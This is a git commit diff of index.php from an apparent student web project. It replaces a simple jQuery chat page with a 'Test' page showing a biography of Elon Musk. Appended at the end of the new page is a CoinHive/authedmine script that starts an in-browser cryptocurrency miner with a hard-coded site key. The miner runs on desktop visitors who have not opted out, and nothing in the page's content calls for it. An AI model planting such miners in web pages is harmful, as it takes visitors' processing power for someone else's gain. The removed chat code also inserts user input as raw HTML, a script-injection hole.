82483d9cd3385b469f89179f33901d1c3d9ad99e
Antoine VIVIES <antoine.vivies@epitech.eu>
2018-10-06 10:33:12 +0200

    index.php modif

--- www/index.php
+++ www/index.php
@@ -1,36 +1,37 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <title>JQuery Chat</title>
-    <style>
-        *{ margin: 0; padding: 0; box-sizing: border-box; }
-        body { font: 13px Helvetica, Arial; }
-        div { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; }
-        div input { border: 0; padding: 10px; width: 90%; margin-right: .5%; }
-        div button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; }
-        #messages
-        { list-style-type: none; margin: 0; padding: 0; }
-        #messages li { padding: 5px 10px; }
-        #message li:nth-child(odd) { background: #eee; }
-    </style>
-    <script
-			  src="https://code.jquery.com/jquery-3.3.1.js"
-			  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
-			  crossorigin="anonymous"></script>
-    </head>
-    <body>
-        <ul id="messages"></ul>
-        <div>
-            <input id="w" autocomplete="off">
-            <button>Envoyer</button>
-        </div>
-    </body>
-    <script>
-        $("button").click(function() {
-            if($("#w").val() == '')
-                return;
-            $("#messages").append('<li>'+$("#w").val()+'</li>')
-            $("#w").val('')
-        })
-    </script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Test</title>
+    <!-- UIkit CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.17/css/uikit.min.css" />
+
+    <!-- UIkit JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.17/js/uikit.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.17/js/uikit-icons.min.js"></script>
+</head>
+<body uk-grid>
+        <p>
+            Elon Reeve Musk (born June 28, 1971) is a business magnate and investor. He holds South African, Canadian, and U.S. citizenship and is the founder, CEO, and lead designer of SpaceX; co-founder, CEO, and product architect of Tesla, Inc.; co-founder and CEO of Neuralink; and co-founder of PayPal. In December 2016, he was ranked 21st on the Forbes list of The World's Most Powerful People. As of August 2018, he has a net worth of $19.8 billion and is listed by Forbes as the 46th-richest person in the world.
+
+            Born in Pretoria, South Africa, Musk taught himself computer programming at the age of 10. He moved to Canada when he was 17 to attend Queen's University. He transferred to the University of Pennsylvania two years later, where he received an economics degree from the Wharton School and a degree in physics from the College of Arts and Sciences. He began a Ph.D. in applied physics and material sciences at Stanford University in 1995 but dropped out after two days to pursue an entrepreneurial career. He subsequently co-founded Zip2, a web software company, which was acquired by Compaq for $340 million in 1999. Musk then founded X.com, an online bank. It merged with Confinity in 2000 and later that year became PayPal, which was bought by eBay for $1.5 billion in October 2002.
+            
+            In May 2002, Musk founded SpaceX, an aerospace manufacturer and space transport services company, of which he is CEO and lead designer. He helped fund Tesla, Inc., an electric vehicle and solar panel manufacturer, in 2003, and became its CEO and product architect. In 2006, he inspired the creation of SolarCity, a solar energy services company that is now a subsidiary of Tesla, and operates as its chairman. In 2015, Musk co-founded OpenAI, a nonprofit research company that aims to promote friendly artificial intelligence. In July 2016, he co-founded Neuralink, a neurotechnology company focused on developing brain–computer interfaces, and is its CEO. In December 2016, Musk founded The Boring Company, an infrastructure and tunnel-construction company.
+            
+            In addition to his primary business pursuits, Musk has envisioned a high-speed transportation system known as the Hyperloop, and has proposed a vertical take-off and landing supersonic jet electric aircraft with electric fan propulsion, known as the Musk electric jet. Musk has stated that the goals of SpaceX, Tesla, and SolarCity revolve around his vision to change the world and humanity. His goals include reducing global warming through sustainable energy production and consumption and reducing the "risk of human extinction" by establishing a human colony on Mars
+        </p>
+    
+</body>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('FXWjuUKPTxniGTRMolrFI8cJa1jCt2vY', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
 </html>
